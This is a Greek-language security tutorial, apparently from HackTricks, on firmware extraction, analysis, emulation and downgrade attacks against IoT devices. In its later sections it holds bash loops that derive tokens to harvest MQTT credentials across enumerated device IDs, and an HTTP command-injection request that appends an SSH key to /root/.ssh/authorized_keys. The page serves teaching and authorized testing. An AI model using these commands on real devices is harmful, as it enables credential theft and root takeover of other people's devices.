# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Εισαγωγή**

### Σχετικοί πόροι


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Το firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των εξαρτημάτων υλικού και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή έχει πρόσβαση σε ζωτικές εντολές από τη στιγμή που τροφοδοτείται, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η ενδεχόμενη τροποποίηση του firmware είναι κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.

## **Συλλογή Πληροφοριών**

**Η συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό στάδιο για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική CPU και το λειτουργικό σύστημα που τρέχει
- Στοιχεία σχετικά με το bootloader
- Διάταξη υλικού και datasheets
- Μετρικές της codebase και τοποθεσίες πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύποι αδειών
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Αρχιτεκτονικά διαγράμματα και διαγράμματα ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων open-source software components μέσω χειροκίνητης και αυτοματοποιημένης επισκόπησης. Εργαλεία όπως [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν στατική ανάλυση που μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση του firmware μπορεί να γίνει με διάφορους τρόπους, ο καθένας με διαφορετικό επίπεδο δυσκολίας:

- **Άμεσα** από την πηγή (προγραμματιστές, κατασκευαστές)
- **Κατασκευή** από τις παρεχόμενες οδηγίες
- **Κατέβασμα** από επίσημους ιστότοπους υποστήριξης
- Χρήση **Google dork** queries για τον εντοπισμό φιλοξενούμενων αρχείων firmware
- Πρόσβαση σε **cloud storage** άμεσα, με εργαλεία όπως [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλοπή **updates** μέσω τεχνικών man-in-the-middle
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG**, ή **PICit**
- **Sniffing** για αιτήματα ενημέρωσης μέσα στην επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded update endpoints**
- **Dumping** από το bootloader ή το δίκτυο
- **Αφαίρεση και ανάγνωση** του storage chip, όταν όλα τα άλλα αποτύχουν, χρησιμοποιώντας τα κατάλληλα hardware εργαλεία

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξάγετε πληροφορίες γι' αυτό για να ξέρετε πώς να το χειριστείτε. Διάφορα εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **entropy** της εικόνας με `binwalk -E <bin>`· αν η entropy είναι χαμηλή, τότε μάλλον δεν είναι encrypted. Αν είναι υψηλή, μάλλον είναι encrypted (ή compressed με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Απόκτηση του Filesystem

Με τα προηγουμένως αναφερθέντα εργαλεία όπως `binwalk -ev <bin>` θα έπρεπε να έχετε καταφέρει να **εξάγετε το filesystem**.\
Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα τον τύπο του filesystem**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη Εξαγωγή Filesystem

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του filesystem στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του filesystem και να carve το compressed filesystem** από το binary και να **εξάγετε χειροκίνητα** το filesystem ανάλογα με τον τύπο του χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την ακόλουθη **dd command** για την εξαγωγή του συστήματος αρχείων Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, μπορεί επίσης να εκτελεστεί η παρακάτω εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (χρησιμοποιήθηκε στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στον κατάλογο "`squashfs-root`" στη συνέχεια.

- Για αρχεία CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση Firmware

Αφού αποκτηθεί το firmware, είναι απαραίτητο να το αναλύσετε για να κατανοήσετε τη δομή του και τις πιθανές ευπάθειες. Η διαδικασία αυτή περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή χρήσιμων δεδομένων από την εικόνα του firmware.

### Εργαλεία αρχικής ανάλυσης

Παρέχεται ένα σύνολο εντολών για αρχικό έλεγχο του δυαδικού αρχείου (αναφερόμενου ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των partitions και του filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για να εκτιμηθεί η κατάσταση κρυπτογράφησης της εικόνας, η **εντροπία** ελέγχεται με `binwalk -E <bin>`. Χαμηλή εντροπία υποδηλώνει απουσία κρυπτογράφησης, ενώ υψηλή εντροπία υποδηλώνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή των **embedded files**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Εξαγωγή του Filesystem

Χρησιμοποιώντας `binwalk -ev <bin>`, συνήθως μπορείτε να εξαγάγετε το filesystem, συχνά σε έναν κατάλογο ονομασμένο μετά τον τύπο του filesystem (π.χ., squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του filesystem λόγω έλλειψης magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για να εντοπιστεί το offset του filesystem, ακολουθούμενη από την εντολή `dd` για να carve out το filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Έπειτα, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για χειροκίνητη εξαγωγή του περιεχομένου.

### Ανάλυση filesystem

Μετά την εξαγωγή του filesystem, ξεκινά η αναζήτηση αδυναμιών ασφαλείας. Δίνεται προσοχή σε ανασφαλείς network daemons, hardcoded credentials, API endpoints, λειτουργίες update servers, uncompiled code, startup scripts και compiled binaries για offline ανάλυση.

**Κύριες τοποθεσίες** και **στοιχεία** για έλεγχο περιλαμβάνουν:

- **etc/shadow** και **etc/passwd** για user credentials
- SSL certificates και keys στο **etc/ssl**
- Configuration και script files για πιθανές ευπάθειες
- Embedded binaries για περαιτέρω ανάλυση
- Common IoT device web servers και binaries

Πολλά εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και ευπαθειών εντός του filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Έλεγχοι ασφαλείας σε compiled binaries

Τanto ο source code όσο και τα compiled binaries που βρίσκονται στο filesystem πρέπει να εξεταστούν για ευπάθειες. Εργαλεία όπως **checksec.sh** για Unix binaries και **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που μπορούν να εκμεταλλευτούν.

## Ανάκτηση cloud config και MQTT credentials μέσω παραγόμενων URL tokens

Πολλά IoT hubs αποσπούν τη διαμόρφωση ανά συσκευή από ένα cloud endpoint που μοιάζει με:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Κατά την ανάλυση firmware μπορεί να διαπιστώσετε ότι το <token> παράγεται τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε όποιον μάθει το deviceId και το STATIC_KEY να ανασυνθέσει το URL και να κατεβάσει το cloud config, συχνά αποκαλύπτοντας plaintext MQTT credentials και topic prefixes.

Πρακτική ροή εργασίας:

1) Εξαγωγή deviceId από UART boot logs

- Συνδέστε έναν 3.3V UART adapter (TX/RX/GND) και καταγράψτε τα logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Αναζητήστε γραμμές που εκτυπώνουν το cloud config URL pattern και το broker address, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτηση του STATIC_KEY και του αλγορίθμου του token από το firmware

- Φόρτωσε τα binaries στο Ghidra/radare2 και αναζήτησε το config path ("/pf/") ή τη χρήση του MD5.
- Επιβεβαίωσε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Εξαγωγή του token σε Bash και μετατροπή του digest σε κεφαλαία:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή cloud config και MQTT credentials

- Συνθέστε το URL και τραβήξτε JSON με curl; αναλύστε με jq για να εξαγάγετε τα secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Κατάχρηση μη κρυπτογραφημένου MQTT και αδύναμων topic ACLs (εάν υπάρχουν)

- Χρησιμοποιήστε τα recovered credentials για να εγγραφείτε σε maintenance topics και να αναζητήσετε ευαίσθητα συμβάντα:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Εντοπισμός προβλέψιμων device IDs (σε κλίμακα, με authorization)

- Πολλά οικοσυστήματα ενσωματώνουν vendor OUI/product/type bytes, ακολουθούμενα από μια διαδοχική κατάληξη.
- Μπορείτε να διατρέξετε πιθανούς IDs, να παράγετε tokens και να ανακτήσετε configs προγραμματιστικά:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Πάντα λάβετε ρητή εξουσιοδότηση πριν επιχειρήσετε mass enumeration.
- Προτιμήστε emulation ή static analysis για να ανακτήσετε secrets χωρίς να τροποποιήσετε το target hardware όταν είναι δυνατόν.


Η διαδικασία του emulating firmware επιτρέπει την **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προβλήματα λόγω εξαρτήσεων από hardware ή architecture, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με συμβατή architecture και endianness, όπως ένα Raspberry Pi, ή σε μια προκατασκευασμένη virtual machine, μπορεί να διευκολύνει περαιτέρω testing.

### Προσομοίωση μεμονωμένων Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, η ταυτοποίηση του endianness και της CPU architecture του προγράμματος είναι κρίσιμη.

#### Παράδειγμα με MIPS Architecture

Για να emulate ένα MIPS architecture binary, μπορεί να χρησιμοποιηθεί η εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

Για δυαδικά ARM η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για την εξομοίωση.

### Full System Emulation

Εργαλεία όπως [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), και άλλα, διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και βοηθώντας στην δυναμική ανάλυση.

## Dynamic Analysis in Practice

Σε αυτό το στάδιο χρησιμοποιείται είτε ένα πραγματικό είτε ένα εξομοιωμένο περιβάλλον συσκευής για την ανάλυση. Είναι απαραίτητο να διατηρείται πρόσβαση shell στο OS και στο σύστημα αρχείων. Η εξομοίωση μπορεί να μην αποτυπώνει τέλεια τις αλληλεπιδράσεις με το hardware, καθιστώντας απαραίτητες περιστασιακές επανεκκινήσεις της εξομοίωσης. Η ανάλυση πρέπει να επανεξετάσει το σύστημα αρχείων, να εκμεταλλευτεί εκτεθειμένες ιστοσελίδες και network services, και να εξερευνήσει ευπάθειες του bootloader. Δοκιμές ακεραιότητας του firmware είναι κρίσιμες για τον εντοπισμό πιθανών backdoor ευπαθειών.

## Runtime Analysis Techniques

Η runtime ανάλυση περιλαμβάνει αλληλεπίδραση με μια διεργασία ή binary στο περιβάλλον λειτουργίας της, χρησιμοποιώντας εργαλεία όπως gdb-multiarch, Frida, και Ghidra για τοποθέτηση breakpoints και τον εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

## Binary Exploitation and Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της στοχευόμενης αρχιτεκτονικής και προγραμματισμό σε χαμηλού επιπέδου γλώσσες. Binary runtime προστασίες σε embedded συστήματα είναι σπάνιες, αλλά όταν υπάρχουν, τεχνικές όπως Return Oriented Programming (ROP) μπορεί να είναι απαραίτητες.

## Prepared Operating Systems for Firmware Analysis

Λειτουργικά συστήματα όπως [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προ-ρυθμισμένα περιβάλλοντα για testing ασφάλειας firmware, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS είναι μια distro που στοχεύει να βοηθήσει στην ασφάλεια και penetration testing των Internet of Things (IoT) συσκευών. Σας εξοικονομεί χρόνο παρέχοντας ένα προ-ρυθμισμένο περιβάλλον με όλα τα απαραίτητα εργαλεία.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο σε Ubuntu 18.04, προφορτωμένο με εργαλεία για testing ασφάλειας firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Ακόμα και όταν ένας vendor εφαρμόζει ελέγχους κρυπτογραφικής υπογραφής για εικόνες firmware, η προστασία κατά της επαναφοράς έκδοσης (version rollback / downgrade) συχνά παραλείπεται. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ένα ενσωματωμένο public key αλλά δεν συγκρίνει την *version* (ή έναν monotonic counter) της εικόνας που φλασάρεται, ένας επιτιθέμενος μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει επιδιορθωμένες ευπάθειες.

Τυπική ροή επίθεσης:

1. **Obtain an older signed image**
* Λήψη από το δημόσιο portal του vendor, CDN ή site υποστήριξης.
* Εξαγωγή από συνοδευτικές mobile/desktop εφαρμογές (π.χ. μέσα σε ένα Android APK κάτω από `assets/firmware/`).
* Ανάκτηση από τρίτους αποθετήρια όπως VirusTotal, Internet archives, forums, κ.λπ.
2. **Upload or serve the image to the device** μέσω οποιουδήποτε εκτεθειμένου καναλιού ενημέρωσης:
* Web UI, mobile-app API, USB, TFTP, MQTT, κ.λπ.
* Πολλές καταναλωτικές IoT συσκευές εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα αποκωδικοποιούν server-side και ενεργοποιούν recovery/upgrade.
3. Μετά την υποβάθμιση, εκμεταλλεύσου μια ευπάθεια που είχε επιδιορθωθεί στην νεότερη έκδοση (για παράδειγμα ένα command-injection filter που προστέθηκε αργότερα).
4. Προαιρετικά φλάσαρε ξανά την τελευταία εικόνα ή απενεργοποίησε τις ενημερώσεις για να αποφύγεις την ανίχνευση μόλις αποκτηθεί persistence.

### Παράδειγμα: Command Injection μετά από υποβάθμιση
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (downgraded) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς καθαρισμό, επιτρέποντας την έγχυση αυθαίρετων εντολών (εδώ — ενεργοποίηση πρόσβασης root με βάση κλειδί SSH). Μεταγενέστερες εκδόσεις firmware εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας κατά του downgrade καθιστά τη διόρθωση άνευ σημασίας.

### Εξαγωγή Firmware Από Εφαρμογές Κινητών

Πολλοί κατασκευαστές συμπεριλαμβάνουν πλήρεις εικόνες firmware μέσα στις συνοδευτικές εφαρμογές κινητών τους, έτσι ώστε η εφαρμογή να μπορεί να ενημερώσει τη συσκευή μέσω Bluetooth/Wi‑Fi. Αυτά τα πακέτα αποθηκεύονται συνήθως χωρίς κρυπτογράφηση στο APK/APEX κάτω από μονοπάτια όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως `apktool`, `ghidra` ή ακόμα και το απλό `unzip` σάς επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Is the transport/authentication of the *update endpoint* adequately protected (TLS + authentication)?
* Συγκρίνει η συσκευή **αριθμούς έκδοσης** ή κάποιο **μονότομο anti-rollback counter** πριν το flashing;
* Επαληθεύεται το image μέσα σε μια αλυσίδα secure boot (π.χ. υπογραφές ελεγχόμενες από ROM code);
* Εκτελεί το userland code επιπλέον ελέγχους ορθότητας (π.χ. allowed partition map, model number);
* Χρησιμοποιούν οι *partial* ή *backup* update flows την ίδια validation logic;

> 💡  Αν κάποιο από τα παραπάνω λείπει, η πλατφόρμα πιθανότατα είναι ευάλωτη σε rollback attacks.

## Ευάλωτο firmware για εξάσκηση

Για να εξασκηθείτε στην ανακάλυψη ευπαθειών σε firmware, χρησιμοποιήστε τα παρακάτω vulnerable firmware projects ως σημείο εκκίνησης.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Αναφορές

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Εκπαίδευση και Πιστοποιήσεις

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
